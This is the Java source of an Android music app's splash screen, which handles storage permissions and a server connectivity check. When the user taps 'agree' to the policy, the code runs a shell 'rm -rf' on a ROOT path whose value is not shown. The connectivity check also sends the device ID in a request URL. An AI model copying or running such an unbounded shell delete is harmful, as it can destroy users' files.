package com.cloudlisten.music;

import static com.cloudlisten.music.Toolutils.ROOT;
import static com.cloudlisten.music.Toolutils.set;

import android.Manifest;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.provider.Settings.Secure;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.cloudlisten.music.databinding.ActivityMainBinding;
import com.cloudlisten.music.utils.AppConfig;
import com.cloudlisten.music.utils.EnCode;
import com.cloudlisten.music.utils.ToolUtils;
import com.cloudlisten.music.utils.okhttp3.OKHttpCallBack;
import com.cloudlisten.music.utils.okhttp3.OKHttpUtils;
import com.google.android.material.bottomsheet.BottomSheetBehavior;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.xuexiang.xui.utils.XToastUtils;

import java.io.IOException;

import okhttp3.Call;

public class SplashActivity extends BaseActivity {

    final int SPLASH_DISPLAY_LENGHT = 2000;
    private ActivityMainBinding binding;
    private BottomSheetBehavior bottomsheet;
    private Handler handler = new Handler();
    public int REQUEST_PERMISSION_NUMBER = 0;
    private final int REQUEST_PERMISSION_CODE = 111;

    private String[] PERMISSION_STORAGE = {Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.MANAGE_EXTERNAL_STORAGE};
    private String[] PERMISSION_STORAGE2 = {Manifest.permission.READ_MEDIA_IMAGES,Manifest.permission.READ_MEDIA_VIDEO,Manifest.permission.READ_MEDIA_AUDIO};

    private void toMainActivity() {
        startActivity(new Intent(SplashActivity.this,MainActivity.class));
        overridePendingTransition(R.anim.splash_right,R.anim.splash_left);
        finish();
    }

    private void toCheckConnect() {
        String apikey = new AppConfig().apikey;
        String apiurl_listen = new AppConfig().apiurl_listen;
        String device_id = Secure.getString(SplashActivity.this.getContentResolver(),Secure.ANDROID_ID);
        String listenurl = apiurl_listen + "listenerapi.php" + "?" + "serverkey" + "=" + EnCode.Base64Jie(apikey) + "&" + "type" + "=" + "2" + "&" + "device" + "=" + device_id;
        OKHttpUtils.newBuilder().url(listenurl)
                .get()
                .build()
                .enqueue(new OKHttpCallBack<UserInfoBean>() {

                    @Override
                    public void onSuccess(UserInfoBean userInfoBean) {
                        String code = userInfoBean.getCode().toString();
                        if (code.matches("200")) {
                            toMainActivity();
                        } else {
                            XToastUtils.error(R.string.server_failed);
                        }
                    }

                    @Override
                    public void onError(int code) {
                        new Handler().postDelayed(new Runnable()  {
                            @Override
                            public void run() {
                                toCheckConnect();
                            }
                        },3000);
                        XToastUtils.error(R.string.connect_exception);
                        /*Toast.makeText(SplashActivity.this,"服务器连接异常！",Toast.LENGTH_SHORT).show();*/
                    }

                    @Override
                    public void onFailure(Call call, IOException e) {
                        new Handler().postDelayed(new Runnable()  {
                            @Override
                            public void run() {
                                toCheckConnect();
                            }
                        },3000);
                        XToastUtils.error(R.string.connect_failed);
                        /*Toast.makeText(SplashActivity.this,"服务器连接失败！",Toast.LENGTH_SHORT).show();*/
                    }

                });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(R.layout.activity_splash);
        View decorView = getWindow().getDecorView();
        // Hide both the navigation bar and the status bar.
        // SYSTEM_UI_FLAG_FULLSCREEN is only available on Android 4.1 and higher, but as
        // a general rule, you should design your app to hide the status bar whenever you
        // hide the navigation bar.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                getWindow().setStatusBarColor(Color.TRANSPARENT);
                getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN);
                getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
            } catch (Exception e) {

            }
        }
        GetPermission(REQUEST_PERMISSION_NUMBER);
    }

    private void opareButtonSheet(int value) {
        View bottomSheet = findViewById(R.id.standard_bottom_sheet);
        BottomSheetBehavior behavior = BottomSheetBehavior.from(bottomSheet);
        switch (value) {
            case 0:
                behavior.setState(BottomSheetBehavior.STATE_HIDDEN);
                break;
            case 1:
                behavior.setState(BottomSheetBehavior.STATE_EXPANDED);
                break;
            default:
                Toast.makeText(SplashActivity.this,R.string.appstatus_error,Toast.LENGTH_SHORT).show();
                Handler handler = new Handler();
                new Handler().postDelayed(new Runnable()  {
                    @Override
                    public void run() {
                        finish();
                    }
                },1000);
                break;
        }
    }

    private void activityfunctions(int valuekey) {
        Button button = (Button)findViewById(R.id.agree_policy);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                opareButtonSheet(0);
                ToolUtils.getExecShell("rm -rf " + ROOT);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        MaterialAlertDialogBuilder alertDialog = new MaterialAlertDialogBuilder(SplashActivity.this)
                                .setTitle(R.string.need_permissions)
                                .setIcon(R.mipmap.ic_alert_circle)
                                .setNegativeButton(R.string.button_cancel,new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog,int which) {
                                        finish();
                                    }
                                })
                                .setPositiveButton(R.string.button_beok,new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog,int which) {
                                        if (Build.VERSION.SDK_INT >= 33) {
                                            ActivityCompat.requestPermissions(SplashActivity.this,PERMISSION_STORAGE2,REQUEST_PERMISSION_CODE);
                                        } else {
                                            ActivityCompat.requestPermissions(SplashActivity.this,PERMISSION_STORAGE,REQUEST_PERMISSION_CODE);
                                        }
                                    }
                                })
                                .setMessage(R.string.need_permissions_text);
                        alertDialog.show();
                    }
                },300);
            }
        });
    }

    private void GetPermission(int requestCode) {
        opareButtonSheet(0);
        if (Build.VERSION.SDK_INT >= 33) {
            if (
                    ActivityCompat.checkSelfPermission(SplashActivity.this,Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED
                            ||
                    ActivityCompat.checkSelfPermission(SplashActivity.this,Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED
                            ||
                    ActivityCompat.checkSelfPermission(SplashActivity.this,Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED

            ) {
                new Handler().postDelayed(new Runnable()  {
                    @Override
                    public void run() {
                        opareButtonSheet(1);
                        activityfunctions(requestCode);
                    }
                },SPLASH_DISPLAY_LENGHT);
            } else {
                new Handler().postDelayed(new Runnable()  {
                    @Override
                    public void run() {
                        if (new AppConfig().splash_checkconnect) {
                            toCheckConnect();
                        } else {
                            toMainActivity();
                        }
                    }
                },SPLASH_DISPLAY_LENGHT);
            }
        } else
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            if (ActivityCompat.checkSelfPermission(SplashActivity.this,Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                new Handler().postDelayed(new Runnable()  {
                    @Override
                    public void run() {
                        opareButtonSheet(1);
                        activityfunctions(requestCode);
                    }
                },SPLASH_DISPLAY_LENGHT);
            } else {
                new Handler().postDelayed(new Runnable()  {
                    @Override
                    public void run() {
                        if (new AppConfig().splash_checkconnect) {
                            toCheckConnect();
                        } else {
                            toMainActivity();
                        }
                    }
                },SPLASH_DISPLAY_LENGHT);
            }
        } else {
            MaterialAlertDialogBuilder alertDialog = new MaterialAlertDialogBuilder(SplashActivity.this)
                    .setTitle(R.string.device_abnormal)
                    .setIcon(R.mipmap.ic_bugs)
                    .setPositiveButton(R.string.button_beok,null)
                    .setMessage(R.string.device_abnormal_text);
            alertDialog.show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,String[] permissions,int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION_CODE) {
            if (grantResults.length != 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= 33) {
                    if (ActivityCompat.checkSelfPermission(SplashActivity.this,Manifest.permission.MANAGE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                        MaterialAlertDialogBuilder alertDialog = new MaterialAlertDialogBuilder(SplashActivity.this)
                                .setTitle(R.string.permissions_changed)
                                .setIcon(R.mipmap.ic_android)
                                .setPositiveButton(R.string.button_beok,new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog,int which) {
                                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                                        intent.setData(Uri.parse("package:" + SplashActivity.this.getPackageName()));
                                        startActivityForResult(intent,REQUEST_PERMISSION_CODE);
                                    }
                                })
                                .setMessage(R.string.permissions_changed_message);
                        alertDialog.show();
                    } else {
                        toCheckConnect();
                        String system_path = new AppConfig().system_path;
                        set(ROOT + system_path + "/" + "PolicyState" + ".cld","state","true");
                    }
                } else {
                    toCheckConnect();
                    String system_path = new AppConfig().system_path;
                    set(ROOT + system_path + "/" + "PolicyState" + ".cld","state","true");
                }
            } else {
                Toast.makeText(SplashActivity.this,R.string.permissions_changed_text,Toast.LENGTH_SHORT).show();
                if (REQUEST_PERMISSION_NUMBER >= 2) {
                    new Handler().postDelayed(new Runnable()  {
                        @Override
                        public void run() {
                            finish();
                        }
                    },1000);
                } else {
                    MaterialAlertDialogBuilder alertDialog = new MaterialAlertDialogBuilder(SplashActivity.this)
                            .setTitle(R.string.permissions_warning)
                            .setIcon(R.mipmap.ic_bugs)
                            .setPositiveButton(R.string.button_beok,new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog,int which) {
                                    activityfunctions(requestCode);
                                }
                            })
                            .setMessage(R.string.permissions_warning_text);
                    alertDialog.show();
                    REQUEST_PERMISSION_NUMBER ++;
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode,Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= 33) {
                if (Environment.isExternalStorageManager()) {
                    if (new AppConfig().splash_checkconnect) {
                        toCheckConnect();
                    } else {
                        toMainActivity();
                    }
                    String system_path = new AppConfig().system_path;
                    set(ROOT + system_path + "/" + "PolicyState" + ".cld","state","true");
                } else {
                    MaterialAlertDialogBuilder alertDialog = new MaterialAlertDialogBuilder(SplashActivity.this)
                            .setTitle(R.string.permissions_changed)
                            .setIcon(R.mipmap.ic_bugs)
                            .setPositiveButton(R.string.button_beok,new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog,int which) {
                                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                                    intent.setData(Uri.parse("package:" + SplashActivity.this.getPackageName()));
                                    startActivityForResult(intent,REQUEST_PERMISSION_CODE);
                                }
                            })
                            .setMessage(R.string.permissions_changed_message);
                    alertDialog.show();
                }
            }
        }
    }

    @Override
    public void onBackPressed() {
        SplashActivity.this.finish();
        super.onBackPressed();
    }
}